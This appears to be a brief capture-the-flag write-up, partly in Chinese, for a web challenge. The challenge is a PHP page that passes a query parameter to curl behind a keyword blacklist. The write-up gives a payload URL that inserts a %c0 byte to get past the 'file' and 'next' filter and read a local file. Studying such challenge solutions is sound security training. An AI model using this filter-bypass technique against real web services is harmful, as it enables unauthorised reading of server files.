# web
### hello
```php
<?php
/*
Read /next.txt
Hint for beginners: read curl's manpage.
*/
highlight_file(__FILE__);
$url = 'file:///hi.txt';
if(
    array_key_exists('x', $_GET) &&
    !str_contains(strtolower($_GET['x']),'file') && 
    !str_contains(strtolower($_GET['x']),'next')
){
    $url = $_GET['x'];
}
system('curl '.escapeshellarg($url));
```
存在`strtolower`,使用特殊字符url编码绕过

```http
http://45.147.231.180:8000/?x=fi%c0le:///ne%c0xt.txt
```

# reverse

# pwn

# crypto

# Misc


---
# *相关wp*




2023-09-23   04:55